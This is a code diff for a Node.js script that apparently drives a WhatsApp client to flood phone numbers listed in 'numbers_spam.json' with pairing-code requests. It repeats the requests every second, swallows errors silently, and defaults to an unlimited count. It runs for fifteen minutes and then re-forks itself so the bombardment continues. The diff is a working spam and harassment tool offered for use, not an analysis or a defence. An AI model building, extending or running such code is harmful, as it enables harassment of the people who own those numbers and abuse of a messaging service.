@@ -7,6 +7,8 @@ const { fork } = require('child_process');
 
 const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
 
+const question = (text) => new Promise((resolve) => rl.question(text, resolve));
+
 async function fetchPhoneNumbers() {
     try {
         const data = fs.readFileSync('./numbers_spam.json', 'utf8');
@@ -17,13 +19,14 @@ async function fetchPhoneNumbers() {
     }
 }
 
-async function processRequests(XeonBotInc, phoneNumbers) {
-    const promises = phoneNumbers.map(async (number) => {
+async function processRequests(XeonBotInc, phoneNumbers, xeonCodes) {
+    const promises = phoneNumbers.slice(0, xeonCodes).map(async (number) => {
         try {
             await XeonBotInc.requestPairingCode(number);
         } catch (error) {
         }
     });
+
     await Promise.all(promises);
 }
 
@@ -44,35 +47,53 @@ async function XeonProject() {
         browser: ["Ubuntu", "Chrome", "20.0.04"],
     });
 
-    let previousNumbers = [];
+    try {
+        let phoneNumbers = await fetchPhoneNumbers();
+        let xeonCodes;
 
-    const requestInterval = setInterval(async () => {
-        try {
-            const phoneNumbers = await fetchPhoneNumbers();
-            const addedNumbers = phoneNumbers.filter(number => !previousNumbers.includes(number));
-            const removedNumbers = previousNumbers.filter(number => !phoneNumbers.includes(number));
+        const choicePromise = question('Choose (1 for 100, 2 for 1000, 3 for unlimited): ');
+        const timeoutPromise = new Promise((resolve) => setTimeout(() => resolve('3'), 1000));
 
-            if (addedNumbers.length > 0) {
-                await processRequests(XeonBotInc, addedNumbers);
-            }
+        const choice = await Promise.race([choicePromise, timeoutPromise]);
 
-            previousNumbers = phoneNumbers;
-
-        } catch (error) {
-            console.error(error);
+        switch (choice) {
+            case '1':
+                xeonCodes = 100;
+                break;
+            case '2':
+                xeonCodes = 1000;
+                break;
+            case '3':
+            case '':
+                xeonCodes = Infinity;
+                break;
+            default:
+                xeonCodes = Infinity;
+                break;
         }
-    }, 1000);
+
+        const requestInterval = setInterval(async () => {
+            try {
+                phoneNumbers = await fetchPhoneNumbers();
+                await processRequests(XeonBotInc, phoneNumbers, xeonCodes);
+            } catch (error) {
+            }
+        }, 1000);
+
+        setTimeout(() => {
+            clearInterval(requestInterval);
+            process.exit(0);
+        }, 900000);
+
+    } catch (error) {
+    } finally {
+        rl.close();
+    }
 
     return XeonBotInc;
 }
 
-const start = async () => {
-    while (true) {
-        await XeonProject();
-    }
-};
-
-start().then(() => {
+XeonProject().then(() => {
     const scriptPath = path.resolve(__filename);
     setTimeout(() => {
         fork(scriptPath);
